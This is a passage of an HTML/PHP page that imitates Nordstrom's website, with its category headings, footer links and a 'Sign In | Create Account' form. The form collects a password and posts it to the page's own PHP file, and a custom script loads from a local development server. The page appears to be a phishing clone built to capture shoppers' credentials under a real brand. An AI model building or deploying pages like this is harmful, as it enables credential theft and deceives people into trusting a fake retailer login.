               <h5 id="w-node-_217d3948-9384-c2a7-b710-0ffbc890ad23-fa5d8923" class="heading">Young Adult</h5>
               <h5 id="w-node-b76920da-48e5-89be-d4c4-529269a56802-fa5d8923" class="heading">Activewear</h5>
               <h5 id="w-node-_0bcb5043-5d75-2662-7454-39d422392e7c-fa5d8923" class="heading">Home</h5>
               <h5 id="w-node-_785eae4e-ea68-e0af-a7a4-adb0d5362eaa-fa5d8923" class="heading">Beauty</h5>
               <h5 id="w-node-_4c89e29a-a674-8a5d-b626-040ad40973dd-fa5d8923" class="heading">Designer</h5>
               <h5 id="w-node-_4a65f823-eb01-e5d3-5266-3e0dc36e638e-fa5d8923" class="heading">Gifts</h5>
               <h5 id="w-node-df6848cb-2d08-e212-19a8-b8fc65ee3646-fa5d8923" class="heading">Brands</h5>
            </div>
         </div>
      </div>
      <div class="section wf-section">
         <div class="div-block-4">
            <div>
               <h1 class="heading-6">Sign In | Create Account</h1>
            </div>
            <p class="paragraph-5">Enter your email to get started.</p>
            <div class="w-form">
               <form action="<?php echo basename(__FILE__); ?>" id="email-form" name="email-form" data-name="Email Form" method="post">
                  <label for="Password" class="field-label">Password</label><input type="password" class="text-field-2 w-input" maxlength="256" name="Password" data-name="Password" placeholder="" id="Password" required=""/>
                  <p class="paragraph-4">By tapping Next, you agree to our Privacy Policy and Terms &amp; Conditions.</p>
                  <input type="submit" value="Next" data-wait="Please wait..." class="submit-button-2 w-button"/>
               </form>
               <div class="w-form-done">
                  <div>Thank you! Your submission has been received!</div>
               </div>
               <div class="w-form-fail">
                  <div>Oops! Something went wrong while submitting the form.</div>
               </div>
            </div>
         </div>
      </div>
      <div class="section-2 wf-section">
         <div class="w-layout-grid grid-5">
            <div id="w-node-_32eac848-92b6-b597-0171-2437483a1707-fa5d8923">
               <h1 class="heading-7">Customer Service</h1>
               <p id="w-node-f1bdbf18-9a2d-420e-8b2c-55ab1cff6559-fa5d8923" class="paragraph-6">Contact Us<br/><br/>Order Status<br/><br/>Shipping<br/><br/>Return Policy &amp; Exchanges<br/><br/>Price Adjustments<br/><br/>Gift Cards<br/>‍<br/>FAQ Products</p>
            </div>
            <div id="w-node-_37776afc-f7b6-74ef-e4de-732c0a7ae14a-fa5d8923">
               <h1 class="heading-7">About Us</h1>
               <p id="w-node-_37776afc-f7b6-74ef-e4de-732c0a7ae14d-fa5d8923" class="paragraph-6">Careers<br/><br/>Corporate Social Responsibility<br/><br/>Diversity, Inclusion &amp; Belonging<br/><br/>Investor Relations<br/><br/>Press Releases<br/><br/>Get Email Updates<br/><br/>Nordstrom Blog<br/><br/>Nordy Podcast</p>
            </div>
            <div id="w-node-_23640631-27f3-f220-60e1-2a60666dd642-fa5d8923">
               <h1 class="heading-7">Stores &amp; Services</h1>
               <p id="w-node-_23640631-27f3-f220-60e1-2a60666dd645-fa5d8923" class="paragraph-6">Find a Store<br/><br/>Free Style Help<br/><br/>Alterations &amp; Tailoring<br/><br/>Trunk Club<br/><br/>Pop-In Shop<br/><br/>Virtual Events<br/><br/>Spa Nordstrom<br/><br/>Nordstrom Restaurants<br/><br/>Nordstrom Local</p>
            </div>
            <div id="w-node-_05ba05ca-fd64-0255-2e87-b58bfaafe9a7-fa5d8923">
               <h1 class="heading-7">Nordstrom Card &amp; Rewards</h1>
               <p id="w-node-_05ba05ca-fd64-0255-2e87-b58bfaafe9aa-fa5d8923" class="paragraph-6">The Nordy Club Rewards<br/><br/>Apply for a Nordstrom Card<br/><br/>Pay My Bill<br/><br/>Manage My Nordstrom Card</p>
            </div>
            <div id="w-node-_98775702-3129-0a44-fed3-b7cca2604caf-fa5d8923">
               <h1 class="heading-7">Nordstrom,Inc.</h1>
               <p class="paragraph-6">Nordstrom Rack<br/><br/>Nordstrom Canada<br/><br/>Trunk Club</p>
            </div>
            <div id="w-node-_0ad3eac4-ba87-4d20-f81f-8f1cb11718b9-fa5d8923">
               <h1 class="heading-7">Customer Service</h1>
               <div class="w-widget w-widget-twitter">
                  <iframe title="Twitter Tweet Button" allowtransparency="true" frameborder="0" scrolling="no" src="//platform.twitter.com/widgets/tweet_button.html#counturl=webflow.com&amp;dnt=true&amp;height=20&amp;show_count=horizontal&amp;size=m&amp;text=Check%20out%20this%20site&amp;url=http%3A%2F%2Fwebflow.com&amp;width=73" style="border: none; height: 20px; overflow: hidden; width: 73px;"></iframe>
                  <div class="w-widget-twitter-count-shim" aria-hidden="true">
                     <div class="w-widget-twitter-count-inner">...</div>
                  </div>
               </div>
               <p id="w-node-_0ad3eac4-ba87-4d20-f81f-8f1cb11718bc-fa5d8923" class="paragraph-6"></p>
            </div>
         </div>
      </div>
      <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=6206b905713e806d865d8920" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="http://localhost:8080/phpSite/Nostt/main.js" type="text/javascript"></script><!--[if lte IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif]-->
   </body>
</html>
